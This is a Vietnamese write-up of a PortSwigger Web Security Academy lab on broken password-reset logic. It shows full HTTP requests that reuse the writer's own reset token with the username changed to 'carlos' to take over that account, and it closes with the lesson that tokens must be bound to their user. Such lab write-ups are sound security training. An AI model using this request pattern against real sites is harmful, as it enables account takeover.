![[Pasted image 20261015104935.png]]
-mô tả lab: chức năng reset password của lab này không check token, mình đổi được password của `carlos` luôn.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

### hướng giải
- [ ] mình vào `/forgot-password`, mình nhập user của mình là `test`, mình nhận được email reset có link `/reset-password?temp-forgot-password-token=ABCXYZ`
- [ ] mình click vào link, mình thấy form reset có field ẩn `username=test`
- [ ] sau khi quan sát gói tin submit này, mình thấy body là `temp-forgot-password-token=ABCXYZ&username=test&new-password-1=...&new-password-2=...`
- [ ] mình thử đổi `username=test` thành `username=carlos` mà giữ nguyên token của mình, mình thấy server vẫn cho đổi
- [ ] => nên mình hiểu là server nó không thèm check token có khớp với username không, nó chỉ check token tồn tại là cho đổi

### giải
-bước 1: mình request reset cho account của mình để lấy token xịn:
```
POST /forgot-password HTTP/1.1
...
username=test
```
-mình vào mail server của portswigger (hoặc Burp inbox) lấy token, ví dụ `ABCXYZ`.

-bước 2: mình gửi request đổi password của `carlos` bằng token của mình:
```
POST /reset-password HTTP/1.1
Cookie: session=SESSION_CUA_MINH
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=ABCXYZ&username=carlos&new-password-1=123456&new-password-2=123456
```
![[auth-reset-broken-success.png]]
-sau khi quan sát gói tin trả về này, mình thấy nó báo `Password changed` dù token là của `test`. Là mình biết đã đổi được password `carlos` thành `123456`.

-bước 3: mình login `carlos:123456` rồi vào `/my-account` là solve.

> [!NOTE]
> -bài học của mình: token reset phải gắn với đúng user, lúc submit phải check lại cả 2. Chỉ check token tồn tại là toang.
